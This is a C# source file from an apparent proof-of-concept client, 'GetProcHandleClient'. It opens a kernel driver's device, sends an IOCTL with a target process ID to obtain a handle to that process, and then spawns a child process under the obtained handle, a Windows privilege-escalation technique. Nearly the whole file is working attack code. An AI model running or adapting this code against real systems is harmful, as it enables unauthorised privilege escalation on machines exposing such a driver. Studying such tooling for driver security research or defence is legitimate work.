using System;
using System.Runtime.InteropServices;
using GetProcHandleClient.Interop;

namespace GetProcHandleClient.Library
{
    using NTSTATUS = Int32;

    internal class Modules
    {
        public static bool SpawnChildProcess(int pid, string command)
        {
            NTSTATUS ntstatus;
            IntPtr hProcess;
            var bSuccess = false;
            IntPtr pInBuffer = Marshal.AllocHGlobal(4);
            IntPtr pOutBuffer = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteInt32(pInBuffer, pid);
            Marshal.WriteIntPtr(pOutBuffer, IntPtr.Zero);

            Console.WriteLine("[>] Sending a query to {0}.", Globals.SYMLINK_PATH);

            do
            {
                IntPtr hDevice;

                using (var objectAttributes = new OBJECT_ATTRIBUTES(
                    Globals.SYMLINK_PATH,
                    OBJECT_ATTRIBUTES_FLAGS.OBJ_CASE_INSENSITIVE))
                {
                    ntstatus = NativeMethods.NtCreateFile(
                        out hDevice,
                        ACCESS_MASK.GENERIC_READ | ACCESS_MASK.GENERIC_WRITE,
                        in objectAttributes,
                        out IO_STATUS_BLOCK _,
                        IntPtr.Zero,
                        FILE_ATTRIBUTE_FLAGS.NORMAL,
                        FILE_SHARE_ACCESS.NONE,
                        FILE_CREATE_DISPOSITION.OPEN,
                        FILE_CREATE_OPTIONS.NON_DIRECTORY_FILE,
                        IntPtr.Zero,
                        0u);
                }

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to open {0} (NTSTATUS = 0x{1}).", Globals.SYMLINK_PATH, ntstatus.ToString("X8"));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a handle to {0} (Handle = 0x{1})", Globals.SYMLINK_PATH, hDevice.ToString("X"));
                }

                ntstatus = NativeMethods.NtDeviceIoControlFile(
                    hDevice,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    out IO_STATUS_BLOCK _,
                    Globals.IOCTL_GET_PROC_HANDLE,
                    pInBuffer,
                    4u,
                    pOutBuffer,
                    (uint)IntPtr.Size);
                NativeMethods.NtClose(hDevice);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to NtDeviceIoControlFile() (NTSTATUS = 0x{0}).", ntstatus.ToString("X8"));
                    break;
                }
                else
                {
                    hProcess = Marshal.ReadIntPtr(pOutBuffer);

                    Console.WriteLine("[+] Got a handle to the target process (Handle = 0x{0}).", hProcess.ToString("X"));
                }

                Console.WriteLine("[>] Trying to create child process from the handle.");
                Console.WriteLine("    [*] Process ID   : {0}", pid);
                Console.WriteLine("    [*] Process Name : {0}", Utilities.GetImageFileNameByProcessHandle(hProcess) ?? "N/A");

                bSuccess = Utilities.CreateChildProcessByHandle(
                    hProcess,
                    command,
                    out int newPid,
                    out int newTid);
                NativeMethods.NtClose(hProcess);

                if (!bSuccess)
                {
                    Console.WriteLine("[-] Failed to create child process (ERROR = 0x{0})", Marshal.GetLastWin32Error());
                }
                else
                {
                    Console.WriteLine("[+] Got a new process.");
                    Console.WriteLine("    [*] Process ID : {0}", newPid);
                    Console.WriteLine("    [*] Thread ID  : {0}", newTid);
                }
            } while (false);

            Marshal.FreeHGlobal(pOutBuffer);
            Marshal.FreeHGlobal(pInBuffer);

            Console.WriteLine("[*] Done.");

            return bSuccess;
        }
    }
}
